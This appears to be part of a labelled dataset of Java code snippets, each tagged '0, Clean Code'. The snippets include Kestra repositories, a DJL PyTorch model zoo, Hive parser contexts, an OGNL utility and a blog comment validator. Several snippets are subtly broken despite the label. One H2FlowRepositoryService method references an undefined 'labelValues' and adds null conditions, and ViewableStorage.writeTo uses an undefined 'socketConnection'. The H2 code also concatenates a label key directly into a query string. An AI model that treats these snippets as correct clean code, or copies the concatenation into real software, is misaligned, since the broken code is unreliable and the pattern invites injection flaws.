  String checkAndCreateContextID(  String jsonFlow,  String flowVersion,  String workspace,  String project,  String flow,  String user,  boolean fullCheck);
  /** 
 * 解析jsonFlow、DWSProject内容，存储到CS里 解析DWSProject、jsonFlow里面的资源、变量、节点依赖等信息，存储到CS服务
 * @param jsonFlow
 * @param parentFlowID
 */
  void checkAndSaveContext(  String jsonFlow,  String parentFlowID) throws DSSErrorException ;
  /** 
 * 检查更新ContextID信息，解析传入的jsonFlow、DWSProject内容，存储到CS里
 * @param jsonFlow 必需
 * @param parentFlowId 必需
 * @param workspace
 * @param flowVersion
 * @param user
 * @throws DSSErrorException
 */
  String checkAndInitContext(  String jsonFlow,  String parentFlowId,  String workspace,  String projectName,  String flowName,  String flowVersion,  String user) throws DSSErrorException ;
}
",0,Clean Code
"/** 
 * Attribute class for standards-track  {@code Signature} attributes.
 */
public final class AttSignature extends BaseAttribute {
  /** 
 * {@code non-null;} attribute name for attributes of this type 
 */
  public static final String ATTRIBUTE_NAME=""Signature"";
  /** 
 * {@code non-null;} the signature string 
 */
  private final CstString signature;
  /** 
 * Constructs an instance.
 * @param signature {@code non-null;} the signature string
 */
  public AttSignature(  CstString signature){
    super(ATTRIBUTE_NAME);
    if (signature == null) {
      throw new NullPointerException(""signature == null"");
    }
    this.signature=signature;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int byteLength(){
    return 8;
  }
  /** 
 * Gets the signature string.
 * @return {@code non-null;} the signature string
 */
  public CstString getSignature(){
    return signature;
  }
}
",0,Clean Code
"/** 
 * Created by qiaoruikai on 2019/11/26 9:43 PM.
 */
public interface TouchService extends ExportService {
  /** 
 * 点击
 * @param x
 * @param y
 */
  public void click(  int x,  int y);
  /** 
 * 长按
 * @param x
 * @param y
 * @param pressTime
 */
  public void press(  int x,  int y,  int pressTime);
  /** 
 * 滑动
 * @param x1
 * @param y1
 * @param x2
 * @param y2
 */
  public void scroll(  int x1,  int y1,  int x2,  int y2,  int scrollTime);
  /** 
 * 拖动
 * @param x1
 * @param y1
 * @param dragTime
 * @param x2
 * @param y2
 * @param scrollTime
 */
  public void drag(  int x1,  int y1,  int dragTime,  int x2,  int y2,  int scrollTime);
  /** 
 * 连续手势操作
 * @param gesture
 */
  public void gesture(  ContinueGesture gesture);
  /** 
 * 缩放
 * @param x
 * @param y
 * @param sourceRadio
 * @param toRadio
 * @param time
 */
  public void pinch(  int x,  int y,  int sourceRadio,  int toRadio,  int time);
  /** 
 * 多手势
 * @param gestures
 */
  public void multiGesture(  ContinueGesture[] gestures);
  /** 
 * 开始
 */
  public void start();
  /** 
 * 结束
 */
  public void stop();
  /** 
 * 是否支持高级手势
 * @return
 */
  public boolean supportGesture();
}",0,Clean Code
"/** 
 * PtModelZoo is a repository that contains all PyTorch models in  {@link ai.djl.pytorch.engine.PtSymbolBlock} for DJL.
 */
public class PtModelZoo extends ModelZoo {
  private static final String DJL_REPO_URL=""https://mlrepo.djl.ai/"";
  private static final Repository REPOSITORY=Repository.newInstance(""PyTorch"",DJL_REPO_URL);
  public static final String GROUP_ID=""ai.djl.pytorch"";
  PtModelZoo(){
    addModel(REPOSITORY.model(CV.ACTION_RECOGNITION,GROUP_ID,""Human-Action-Recognition-VIT-Base-patch16-224"",""0.0.1""));
    addModel(REPOSITORY.model(CV.IMAGE_CLASSIFICATION,GROUP_ID,""resnet"",""0.0.1""));
    addModel(REPOSITORY.model(CV.IMAGE_CLASSIFICATION,GROUP_ID,""resnet18_embedding"",""0.0.1""));
    addModel(REPOSITORY.model(CV.INSTANCE_SEGMENTATION,GROUP_ID,""yolo11n-seg"",""0.0.1""));
    addModel(REPOSITORY.model(CV.INSTANCE_SEGMENTATION,GROUP_ID,""yolov8n-seg"",""0.0.1""));
    addModel(REPOSITORY.model(CV.MASK_GENERATION,GROUP_ID,""sam2-hiera-tiny"",""0.0.1""));
    addModel(REPOSITORY.model(CV.MASK_GENERATION,GROUP_ID,""sam2-hiera-large"",""0.0.1""));
    addModel(REPOSITORY.model(CV.OBJECT_DETECTION,GROUP_ID,""ssd"",""0.0.1""));
    addModel(REPOSITORY.model(CV.OBJECT_DETECTION,GROUP_ID,""yolo11n"",""0.0.1""));
    addModel(REPOSITORY.model(CV.OBJECT_DETECTION,GROUP_ID,""yolov5s"",""0.0.1""));
    addModel(REPOSITORY.model(CV.OBJECT_DETECTION,GROUP_ID,""yolov8n"",""0.0.1""));
    addModel(REPOSITORY.model(CV.POSE_ESTIMATION,GROUP_ID,""yolo11n-pose"",""0.0.1""));
    addModel(REPOSITORY.model(CV.POSE_ESTIMATION,GROUP_ID,""yolov8n-pose"",""0.0.1""));
    addModel(REPOSITORY.model(NLP.QUESTION_ANSWER,GROUP_ID,""bertqa"",""0.0.1""));
    addModel(REPOSITORY.model(NLP.SENTIMENT_ANALYSIS,GROUP_ID,""distilbert"",""0.0.1""));
    addModel(REPOSITORY.model(CV.IMAGE_GENERATION,GROUP_ID,""biggan-deep"",""0.0.1""));
    addModel(REPOSITORY.model(CV.IMAGE_GENERATION,GROUP_ID,""cyclegan"",""0.0.1""));
    addModel(REPOSITORY.model(CV.SEMANTIC_SEGMENTATION,GROUP_ID,""deeplabv3"",""0.0.1""));
    addModel(REPOSITORY.model(TimeSeries.FORECASTING,GROUP_ID,""deepar"",""0.0.1""));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String getGroupId(){
    return GROUP_ID;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Set<String> getSupportedEngines(){
    return Collections.singleton(PtEngine.ENGINE_NAME);
  }
}
",0,Clean Code
"public abstract class H2FlowRepositoryService {
  public static Condition findCondition(  AbstractJdbcRepository<Flow> jdbcRepository,  String query,  Map<String,String> labels){
    List<Condition> conditions=new ArrayList<>();
    if (query != null) {
      conditions.add(jdbcRepository.fullTextCondition(List.of(""fulltext""),query));
    }
    if (labels != null) {
      labels.forEach((key,value) -> {
        Field<String> valueField=DSL.field(""JQ_STRING(\""value\"", '.labels[]? | select(.key == \"""" + key + ""\"") | .value')"",String.class);
        if (value == null) {
          conditions.add(valueField.isNull());
        }
 else {
          conditions.add(valueField.eq(value));
        }
      }
);
    }
    return conditions.isEmpty() ? DSL.trueCondition() : DSL.and(conditions);
  }
  public static Condition findSourceCodeCondition(  AbstractJdbcRepository<Flow> jdbcRepository,  String query){
    return jdbcRepository.fullTextCondition(List.of(""source_code""),query);
  }
  public static Condition findCondition(  Object labels,  QueryFilter.Op operation){
    List<Condition> conditions=new ArrayList<>();
    if (labels instanceof Map<?,?>) {
      labelValues.forEach((key,value) -> {
        Field<String> valueField=DSL.field(""JQ_STRING(\""value\"", '.labels[]? | select(.key == \"""" + key + ""\"") | .value')"",String.class);
        Condition condition=null;
        conditions.add(condition);
      }
);
    }
    return conditions.isEmpty() ? DSL.trueCondition() : DSL.and(conditions);
  }
}
",0,Clean Code
"public static class Create_routine_paramsContext extends ParserRuleContext {
  public TerminalNode T_OPEN_P(){
    return getToken(HiveSqlParser.T_OPEN_P,0);
  }
  public TerminalNode T_CLOSE_P(){
    return getToken(HiveSqlParser.T_CLOSE_P,0);
  }
  public List<Create_routine_param_itemContext> create_routine_param_item(){
    return getRuleContexts(Create_routine_param_itemContext.class);
  }
  public Create_routine_param_itemContext create_routine_param_item(  int i){
    return getRuleContext(Create_routine_param_itemContext.class,i);
  }
  public List<TerminalNode> T_COMMA(){
    return getTokens(HiveSqlParser.T_COMMA);
  }
  public TerminalNode T_COMMA(  int i){
    return getToken(HiveSqlParser.T_COMMA,i);
  }
  public Create_routine_paramsContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_create_routine_params;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterCreate_routine_params(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitCreate_routine_params(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitCreate_routine_params(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"public final class TestUtils {
  private TestUtils(){
  }
  public static TextEmbedding getTextEmbedding(  NDManager manager,  int embeddingSize){
    return new TextEmbedding(){
      /** 
 * {@inheritDoc} 
 */
      @Override public long[] preprocessTextToEmbed(      List<String> text){
        return new long[text.size()];
      }
      /** 
 * {@inheritDoc} 
 */
      @Override public NDArray embedText(      NDManager manager,      long[] textIndices){
        return manager.zeros(new Shape(textIndices.length,embeddingSize));
      }
      /** 
 * {@inheritDoc} 
 */
      @Override public NDArray embedText(      NDArray textIndices){
        return null;
      }
      /** 
 * {@inheritDoc} 
 */
      @Override public List<String> unembedText(      NDArray textEmbedding){
        return null;
      }
    }
;
  }
}
",0,Clean Code
"public class AppOpsListViewModel extends AndroidViewModel {
  private final ObservableBoolean isDataLoading=new ObservableBoolean(false);
  private final List<Disposable> disposables=new ArrayList<>();
  protected final ObservableArrayList<OpGroup> opGroups=new ObservableArrayList<>();
  private final ObservableInt categoryIndex=new ObservableInt(PkgOpsLoader.FILTER_ALL);
  public AppOpsListViewModel(  @NonNull Application application){
    super(application);
    registerEventReceivers();
  }
  public void start(  AppInfo appInfo){
    loadModels(appInfo);
  }
  private void loadModels(  AppInfo appInfo){
    if (isDataLoading.get())     return;
    isDataLoading.set(true);
    disposables.add(Single.create((SingleOnSubscribe<List<OpGroup>>)emitter -> emitter.onSuccess(new PkgOpsLoader().getPkgOps(getApplication(),appInfo,categoryIndex.get()))).flatMapObservable((Function<List<OpGroup>,ObservableSource<OpGroup>>)Observable::fromIterable).subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).doOnSubscribe(disposable -> opGroups.clear()).subscribe(opGroups::add,Rxs.ON_ERROR_LOGGING,() -> isDataLoading.set(false)));
  }
  private void registerEventReceivers(){
  }
  private void unRegisterEventReceivers(){
  }
  @Override protected void onCleared(){
    super.onCleared();
    CollectionUtils.consumeRemaining(disposables,Disposable::dispose);
    unRegisterEventReceivers();
  }
  void switchOp(  @NonNull Op op,  AppInfo appInfo,  int selectedMode){
    ThanosManager thanos=ThanosManager.from(getApplication());
    if (thanos.isServiceInstalled()) {
      thanos.getAppOpsManager().setMode(op.getCode(),appInfo.getUid(),appInfo.getPkgName(),selectedMode);
      op.setMode(selectedMode);
    }
  }
  void setModeFilter(  int index){
    categoryIndex.set(index);
  }
  public void selectAll(  AppInfo appInfo,  int mode){
    CollectionUtils.consumeRemaining(opGroups,new Consumer<OpGroup>(){
      @Override public void accept(      OpGroup opGroup){
        CollectionUtils.consumeRemaining(opGroup.getOpList(),new Consumer<Op>(){
          @Override public void accept(          Op op){
            switchOp(op,appInfo,mode);
          }
        }
);
      }
    }
);
    start(appInfo);
  }
  public ObservableBoolean getIsDataLoading(){
    return this.isDataLoading;
  }
  public ObservableArrayList<OpGroup> getOpGroups(){
    return this.opGroups;
  }
}
",0,Clean Code
"private static final class ViewableStorage {
  private static final ObjectPool<NetworkBuffer> POOL=ObjectPool.pool(() -> NetworkBuffer.resizableBuffer(ServerFlag.POOLED_BUFFER_SIZE,MinecraftServer.process()),NetworkBuffer::clear);
  private final Int2ObjectMap<LongArrayList> entityIdMap=new Int2ObjectOpenHashMap<>();
  private final NetworkBuffer buffer=POOL.getAndRegister(this);
  private synchronized void append(  ServerPacket serverPacket,  @Nullable Player exception){
    final long start=buffer.writeIndex();
    PacketWriting.writeFramedPacket(buffer,ConnectionState.PLAY,serverPacket,MinecraftServer.getCompressionThreshold());
    final long end=buffer.writeIndex();
    if (exception != null) {
      final long offsets=start << 32 | end & 0xFFFFFFFFL;
      LongList list=entityIdMap.computeIfAbsent(exception.getEntityId(),id -> new LongArrayList());
      list.add(offsets);
    }
  }
  private synchronized void process(  Viewable viewable){
    if (buffer.writeIndex() == 0)     return;
    NetworkBuffer copy=buffer.copy(0,buffer.writeIndex());
    copy.readOnly();
    viewable.getViewers().forEach(player -> processPlayer(player,copy));
    this.buffer.clear();
    this.entityIdMap.clear();
  }
  private void processPlayer(  Player player,  NetworkBuffer buffer){
    final long capacity=buffer.capacity();
    final PlayerConnection connection=player.getPlayerConnection();
    final LongArrayList pairs=entityIdMap.get(player.getEntityId());
    if (pairs == null) {
      writeTo(connection,buffer,0,capacity);
      return;
    }
    int lastWrite=0;
    final long[] elements=pairs.elements();
    for (int i=0; i < pairs.size(); ++i) {
      final long offsets=elements[i];
      final int start=(int)(offsets >> 32);
      if (start != lastWrite)       writeTo(connection,buffer,lastWrite,start - lastWrite);
      lastWrite=(int)offsets;
    }
    if (capacity != lastWrite)     writeTo(connection,buffer,lastWrite,capacity - lastWrite);
  }
  private static void writeTo(  PlayerConnection connection,  NetworkBuffer buffer,  long offset,  long length){
    if (connection instanceof PlayerSocketConnection) {
      socketConnection.sendPacket(new BufferedPacket(buffer,offset,length));
      return;
    }
  }
}
",0,Clean Code
"public class OgnlUtil {
  public static Object getValue(  String expression,  Map<String,Object> root){
    try {
      Map context=Ognl.createDefaultContext(root);
      Object value=Ognl.getValue(Ognl.parseExpression(expression),context,root);
      return value;
    }
 catch (    OgnlException e) {
      throw new RuntimeException(e.getMessage());
    }
  }
  public static Boolean getBooleanValue(  String expression,  Map<String,Object> root){
    Object value=getValue(expression,root);
    if (value instanceof Boolean) {
      return (Boolean)value;
    }
 else     if (value instanceof Number)     return !new BigDecimal(String.valueOf(value)).equals(BigDecimal.ZERO);
 else     throw new RuntimeException(""expression value is not boolean or number type: "" + expression);
  }
  public static Iterable<?> getIterable(  String expression,  Map<String,Object> root){
    Object value=getValue(expression,root);
    if (value == null)     throw new RuntimeException(""The expression '"" + expression + ""' evaluated to a null value."");
    if (value instanceof Iterable)     return (Iterable<?>)value;
    if (value.getClass().isArray()) {
      int size=Array.getLength(value);
      List<Object> answer=new ArrayList<Object>();
      for (int i=0; i < size; i++) {
        Object o=Array.get(value,i);
        answer.add(o);
      }
      return answer;
    }
    if (value instanceof Map) {
      return ((Map)value).entrySet();
    }
    throw new RuntimeException(""Error evaluating expression '"" + expression + ""'.  Return value (""+ value+ "") was not iterable."");
  }
  public static void main(  String[] args){
    Map<String,Object> root=new HashMap<>();
    List<Integer> list=new ArrayList<>();
    list.add(12);
    list.add(22);
    list.add(32);
    list.add(42);
    root.put(""ids"",list);
    Object o=getValue(""ids[3]"",root);
    System.out.println(o);
  }
}
",0,Clean Code
"/** 
 * Validates for comment adding locally.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Feb 11, 2020
 * @since 0.2.0
 */
@Singleton public class CommentAddValidationMidware {
  public void handle(  final RequestContext context){
    final Request request=context.getRequest();
    final JSONObject requestJSONObject=context.requestJSON();
    request.setAttribute(Keys.REQUEST,requestJSONObject);
    final BeanManager beanManager=BeanManager.getInstance();
    final LangPropsService langPropsService=beanManager.getReference(LangPropsService.class);
    final OptionQueryService optionQueryService=beanManager.getReference(OptionQueryService.class);
    final ArticleQueryService articleQueryService=beanManager.getReference(ArticleQueryService.class);
    final CommentQueryService commentQueryService=beanManager.getReference(CommentQueryService.class);
    final JSONObject exception=new JSONObject();
    exception.put(Keys.CODE,StatusCodes.ERR);
    final String commentContent=StringUtils.trim(requestJSONObject.optString(Comment.COMMENT_CONTENT));
    if (StringUtils.isBlank(commentContent) || commentContent.length() > Comment.MAX_COMMENT_CONTENT_LENGTH) {
      context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""commentErrorLabel"")));
      context.abort();
      return;
    }
    if (optionQueryService.containReservedWord(commentContent)) {
      context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""contentContainReservedWordLabel"")));
      context.abort();
      return;
    }
    final String articleId=requestJSONObject.optString(Article.ARTICLE_T_ID);
    if (StringUtils.isBlank(articleId)) {
      context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""commentArticleErrorLabel"")));
      context.abort();
      return;
    }
    final JSONObject article=articleQueryService.getArticleById(articleId);
    if (null == article) {
      context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""commentArticleErrorLabel"")));
      context.abort();
      return;
    }
    if (!article.optBoolean(Article.ARTICLE_COMMENTABLE)) {
      context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""notAllowCmtLabel"")));
      context.abort();
      return;
    }
    final String originalCommentId=requestJSONObject.optString(Comment.COMMENT_ORIGINAL_COMMENT_ID);
    if (StringUtils.isNotBlank(originalCommentId)) {
      final JSONObject originalCmt=commentQueryService.getComment(originalCommentId);
      if (null == originalCmt) {
        context.renderJSON(exception.put(Keys.MSG,langPropsService.get(""commentArticleErrorLabel"")));
        context.abort();
        return;
      }
    }
    context.handle();
  }
}
",0,Clean Code
"@PostgresRepositoryEnabled @EachBean(JdbcTableConfig.class) public class PostgresRepository<T> extends io.kestra.jdbc.AbstractJdbcRepository<T> {
  @Inject public PostgresRepository(  @Parameter JdbcTableConfig jdbcTableConfig,  QueueService queueService,  JooqDSLContextWrapper dslContextWrapper){
    super(jdbcTableConfig,queueService,dslContextWrapper);
  }
  @Override public Condition fullTextCondition(  List<String> fields,  String query){
    if (query == null || query.equals(""*"")) {
      return DSL.trueCondition();
    }
    if (fields.size() > 1) {
      throw new IllegalArgumentException(""Invalid fullTextCondition"" + fields);
    }
    return DSL.condition(fields.getFirst() + "" @@ FULLTEXT_SEARCH(?)"",query);
  }
  @SneakyThrows @Override public Map<Field<Object>,Object> persistFields(  T entity){
    String json=JdbcMapper.of().writeValueAsString(entity);
    return new HashMap<>(ImmutableMap.of(io.kestra.jdbc.repository.AbstractJdbcRepository.field(""value""),DSL.val(JSONB.valueOf(json))));
  }
  @SneakyThrows @Override public void persist(  T entity,  DSLContext context,  @Nullable Map<Field<Object>,Object> fields){
    Map<Field<Object>,Object> finalFields=fields == null ? this.persistFields(entity) : fields;
    context.insertInto(table).set(AbstractJdbcRepository.field(""key""),key(entity)).set(finalFields).onConflict(AbstractJdbcRepository.field(""key"")).doUpdate().set(finalFields).execute();
  }
  @Override public int persistBatch(  List<T> items){
    return dslContextWrapper.transactionResult(configuration -> {
      DSLContext dslContext=DSL.using(configuration);
      var inserts=items.stream().map(item -> {
        Map<Field<Object>,Object> finalFields=this.persistFields(item);
        return dslContext.insertInto(table).set(AbstractJdbcRepository.field(""key""),key(item)).set(finalFields).onConflict(AbstractJdbcRepository.field(""key"")).doUpdate().set(finalFields);
      }
).toList();
      return Arrays.stream(dslContext.batch(inserts).execute()).sum();
    }
);
  }
  @SuppressWarnings(""unchecked"") @Override public <R extends Record,E>ArrayListTotal<E> fetchPage(  DSLContext context,  SelectConditionStep<R> select,  Pageable pageable,  RecordMapper<R,E> mapper){
    Result<Record> results=this.limit(context.select(DSL.asterisk(),DSL.count().over().as(""total_count"")).from(this.sort(select,pageable).asTable(""page"")).where(DSL.trueCondition()),pageable).fetch();
    Integer totalCount=results.size() > 0 ? results.getFirst().get(""total_count"",Integer.class) : 0;
    List<E> map=results.map((    Record record) -> mapper.map((R)record));
    return new ArrayListTotal<>(map,totalCount);
  }
  @Override public <R extends Record>T map(  R record){
    if (deserializer != null) {
      return deserializer.apply(record);
    }
 else {
      return this.deserialize(record.get(""value"",JSONB.class).data());
    }
  }
}
",0,Clean Code
"/** 
 * The operator 'instanceof' checks if an object is of the class specified in the right hand operand, in the same way that  {@code instanceof} does in Java.
 * @author Andy Clement
 * @since 3.0
 */
class OperatorInstanceof extends Operator {
  private Class<?> type;
  public OperatorInstanceof(  int pos,  SpelNodeImpl... operands){
    super(""instanceof"",pos,operands);
  }
  /** 
 * Compare the left operand to see it is an instance of the type specified as the right operand. The right operand must be a class.
 * @param state the expression state
 * @return true if the left operand is an instanceof of the right operand, otherwisefalse
 * @throws EvaluationException if there is a problem evaluating the expression
 */
  @Override public BooleanTypedValue getValueInternal(  ExpressionState state) throws EvaluationException {
    SpelNodeImpl rightOperand=getRightOperand();
    TypedValue left=getLeftOperand().getValueInternal(state);
    TypedValue right=rightOperand.getValueInternal(state);
    Object leftValue=left.getValue();
    Object rightValue=right.getValue();
    BooleanTypedValue result=null;
    if (rightValue == null || !(rightValue instanceof Class)) {
      throw new SpelEvaluationException(getRightOperand().getStartPosition(),SpelMessage.INSTANCEOF_OPERATOR_NEEDS_CLASS_OPERAND,(rightValue == null ? ""null"" : rightValue.getClass().getName()));
    }
    Class<?> rightClass=(Class<?>)rightValue;
    if (leftValue == null) {
      result=BooleanTypedValue.FALSE;
    }
 else {
      result=BooleanTypedValue.forValue(rightClass.isAssignableFrom(leftValue.getClass()));
    }
    this.type=rightClass;
    if (rightOperand instanceof TypeReference) {
      this.exitTypeDescriptor=""Z"";
    }
    return result;
  }
  @Override public boolean isCompilable(){
    return (this.exitTypeDescriptor != null && getLeftOperand().isCompilable());
  }
  @Override public void generateCode(  MethodVisitor mv,  CodeFlow cf){
    getLeftOperand().generateCode(mv,cf);
    CodeFlow.insertBoxIfNecessary(mv,cf.lastDescriptor());
    if (this.type.isPrimitive()) {
      mv.visitInsn(POP);
      mv.visitInsn(ICONST_0);
    }
 else {
      mv.visitTypeInsn(INSTANCEOF,Type.getInternalName(this.type));
    }
    cf.pushDescriptor(this.exitTypeDescriptor);
  }
}
",0,Clean Code
"/** 
 * Serializing an object containing a byte stream.
 */
abstract public class AbstractStreamSerializer extends AbstractSerializer {
  /** 
 * Writes the object to the output stream.
 */
  @Override public void writeObject(  Object obj,  AbstractHessianOutput out) throws IOException {
    if (out.addRef(obj)) {
      return;
    }
    int ref=out.writeObjectBegin(getClassName(obj));
    if (ref < -1) {
      out.writeString(""value"");
      InputStream is=null;
      try {
        is=getInputStream(obj);
      }
 catch (      Exception e) {
        log.log(Level.WARNING,e.toString(),e);
      }
      if (is != null) {
        try {
          out.writeByteStream(is);
        }
  finally {
          is.close();
        }
      }
 else {
        out.writeNull();
      }
      out.writeMapEnd();
    }
 else {
      if (ref == -1) {
        out.writeClassFieldLength(1);
        out.writeString(""value"");
        out.writeObjectBegin(getClassName(obj));
      }
      InputStream is=null;
      try {
        is=getInputStream(obj);
      }
 catch (      Exception e) {
        log.log(Level.WARNING,e.toString(),e);
      }
      try {
        if (is != null)         out.writeByteStream(is);
 else         out.writeNull();
      }
  finally {
        if (is != null)         is.close();
      }
    }
  }
  protected String getClassName(  Object obj){
    return obj.getClass().getName();
  }
  abstract protected InputStream getInputStream(  Object obj) throws IOException ;
}
",0,Clean Code
"/** 
 * Represents an area that can be generated. <p> The size is guaranteed to be a multiple of 16 (section).
 */
public interface GenerationUnit {
  /** 
 * This unit's modifier, used to place blocks and biomes within this unit.
 * @return the modifier
 */
  @NotNull UnitModifier modifier();
  /** 
 * The size of this unit in blocks. <p> Guaranteed to be a multiple of 16.
 * @return the size of this unit
 */
  @NotNull Point size();
  /** 
 * The absolute start (min x, y, z) of this unit.
 * @return the absolute start
 */
  @NotNull Point absoluteStart();
  /** 
 * The absolute end (max x, y, z) of this unit.
 * @return the absolute end
 */
  @NotNull Point absoluteEnd();
  /** 
 * Creates a fork of this unit, which will be applied to the instance whenever possible.
 * @param start the start of the fork
 * @param end   the end of the fork
 * @return the fork
 */
  @NotNull GenerationUnit fork(  @NotNull Point start,  @NotNull Point end);
  /** 
 * Creates a fork of this unit depending on the blocks placed within the consumer.
 * @param consumer the consumer
 */
  void fork(  @NotNull Consumer<Block.@NotNull Setter> consumer);
  /** 
 * Divides this unit into the smallest independent units.
 * @return an immutable list of independent units
 */
  default @NotNull List<GenerationUnit> subdivide(){
    return List.of(this);
  }
}
",0,Clean Code
"/** 
 * Attribute class for standard  {@code LineNumberTable} attributes. 
 */
public final class AttLineNumberTable extends BaseAttribute {
  /** 
 * {@code non-null;} attribute name for attributes of this type 
 */
  public static final String ATTRIBUTE_NAME=""LineNumberTable"";
  /** 
 * {@code non-null;} list of line number entries 
 */
  private final LineNumberList lineNumbers;
  /** 
 * Constructs an instance.
 * @param lineNumbers {@code non-null;} list of line number entries
 */
  public AttLineNumberTable(  LineNumberList lineNumbers){
    super(ATTRIBUTE_NAME);
    try {
      if (lineNumbers.isMutable()) {
        throw new MutabilityException(""lineNumbers.isMutable()"");
      }
    }
 catch (    NullPointerException ex) {
      throw new NullPointerException(""lineNumbers == null"");
    }
    this.lineNumbers=lineNumbers;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int byteLength(){
    return 8 + 4 * lineNumbers.size();
  }
  /** 
 * Gets the list of ""line number"" entries associated with this instance.
 * @return {@code non-null;} the list
 */
  public LineNumberList getLineNumbers(){
    return lineNumbers;
  }
}
",0,Clean Code
"/** 
 * @author shuzijun
 */
public class SortAction extends AbstractAction implements DumbAware {
  @Override public boolean displayTextInToolbar(){
    return true;
  }
  @Override public void update(  @NotNull AnActionEvent e){
    NavigatorAction navigatorAction=WindowFactory.getDataContext(e.getProject()).getData(DataKeys.LEETCODE_PROJECTS_NAVIGATORACTION);
    Sort sort=getSort(e,navigatorAction);
    if (sort == null) {
      return;
    }
    if (sort.getType() == Constant.SORT_ASC) {
      e.getPresentation().setIcon(LeetCodeEditorIcons.SORT_ASC);
    }
 else     if (sort.getType() == Constant.SORT_DESC) {
      e.getPresentation().setIcon(LeetCodeEditorIcons.SORT_DESC);
    }
 else {
      e.getPresentation().setIcon(null);
    }
    navigatorAction.updateUI();
    super.update(e);
  }
  @Override public void actionPerformed(  AnActionEvent anActionEvent,  Config config){
    NavigatorAction navigatorAction=WindowFactory.getDataContext(anActionEvent.getProject()).getData(DataKeys.LEETCODE_PROJECTS_NAVIGATORACTION);
    if (navigatorAction == null) {
      return;
    }
    Sort sort=getSort(anActionEvent,navigatorAction);
    if (sort == null) {
      return;
    }
    navigatorAction.getFind().operationType(getKey(anActionEvent));
    navigatorAction.sort(sort);
  }
  private Sort getSort(  AnActionEvent anActionEvent,  NavigatorAction navigatorAction){
    return navigatorAction.getFind().getSort(getKey(anActionEvent));
  }
  private String getKey(  AnActionEvent anActionEvent){
    return anActionEvent.getActionManager().getId(this).replace(PluginConstant.LEETCODE_SORT_PREFIX,"""").replace(PluginConstant.LEETCODE_CODETOP_SORT_PREFIX,"""").replace(PluginConstant.LEETCODE_ALL_SORT_PREFIX,"""");
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class DefaultSingleThreadExecutor implements SingleThreadExecutor {
  private final SingleThreadExecutor singleThreadExecutor;
  /** 
 * Anti-gentleman is not against villains, we believe that you are providing a single-thread executor.
 * @param singleThreadExecutorService a {@link ExecutorService} instance
 */
  public DefaultSingleThreadExecutor(  ExecutorService singleThreadExecutorService){
    this.singleThreadExecutor=wrapSingleThreadExecutor(singleThreadExecutorService);
  }
  public DefaultSingleThreadExecutor(  String poolName,  int maxPendingTasks){
    this.singleThreadExecutor=createSingleThreadExecutor(poolName,maxPendingTasks);
  }
  @Override public void execute(  final Runnable task){
    this.singleThreadExecutor.execute(task);
  }
  @Override public boolean shutdownGracefully(){
    return this.singleThreadExecutor.shutdownGracefully();
  }
  @Override public boolean shutdownGracefully(  final long timeout,  final TimeUnit unit){
    return this.singleThreadExecutor.shutdownGracefully(timeout,unit);
  }
  private static SingleThreadExecutor wrapSingleThreadExecutor(  final ExecutorService executor){
    if (executor instanceof SingleThreadExecutor) {
      return (SingleThreadExecutor)executor;
    }
 else {
      return new SingleThreadExecutor(){
        @Override public boolean shutdownGracefully(){
          return ExecutorServiceHelper.shutdownAndAwaitTermination(executor);
        }
        @Override public boolean shutdownGracefully(        final long timeout,        final TimeUnit unit){
          return ExecutorServiceHelper.shutdownAndAwaitTermination(executor,unit.toMillis(timeout));
        }
        @Override public void execute(        final Runnable command){
          executor.execute(command);
        }
      }
;
    }
  }
  private static SingleThreadExecutor createSingleThreadExecutor(  final String poolName,  final int maxPendingTasks){
    final ExecutorService singleThreadPool=ThreadPoolUtil.newBuilder().poolName(poolName).enableMetric(true).coreThreads(1).maximumThreads(1).keepAliveSeconds(60L).workQueue(new LinkedBlockingQueue<>(maxPendingTasks)).threadFactory(new NamedThreadFactory(poolName,true)).build();
    return new SingleThreadExecutor(){
      @Override public boolean shutdownGracefully(){
        return ExecutorServiceHelper.shutdownAndAwaitTermination(singleThreadPool);
      }
      @Override public boolean shutdownGracefully(      final long timeout,      final TimeUnit unit){
        return ExecutorServiceHelper.shutdownAndAwaitTermination(singleThreadPool,unit.toMillis(timeout));
      }
      @Override public void execute(      final Runnable command){
        singleThreadPool.execute(command);
      }
    }
;
  }
}",0,Clean Code
"static class ProcessOutput {
  private List<Function<String,String>> stdoutHandlerChain;
  private StatisticsFunction statisticsHandler=null;
  private List<Function<String,String>> flushHandlerChain=null;
  private String cacheLocation;
  private Tty term;
  public ProcessOutput(  List<Function<String,String>> stdoutHandlerChain,  String cacheLocation,  Tty term){
    int i=0;
    for (; i < stdoutHandlerChain.size(); i++) {
      if (stdoutHandlerChain.get(i) instanceof StatisticsFunction) {
        break;
      }
    }
    if (i < stdoutHandlerChain.size()) {
      this.stdoutHandlerChain=stdoutHandlerChain.subList(0,i + 1);
      this.statisticsHandler=(StatisticsFunction)stdoutHandlerChain.get(i);
      if (i < stdoutHandlerChain.size() - 1) {
        flushHandlerChain=stdoutHandlerChain.subList(i + 1,stdoutHandlerChain.size());
      }
    }
 else {
      this.stdoutHandlerChain=stdoutHandlerChain;
    }
    this.cacheLocation=cacheLocation;
    this.term=term;
  }
  private void write(  String data){
    if (stdoutHandlerChain != null) {
      for (      Function<String,String> function : stdoutHandlerChain) {
        data=function.apply(data);
      }
    }
  }
  private void close(){
    if (statisticsHandler != null && flushHandlerChain != null) {
      String data=statisticsHandler.result();
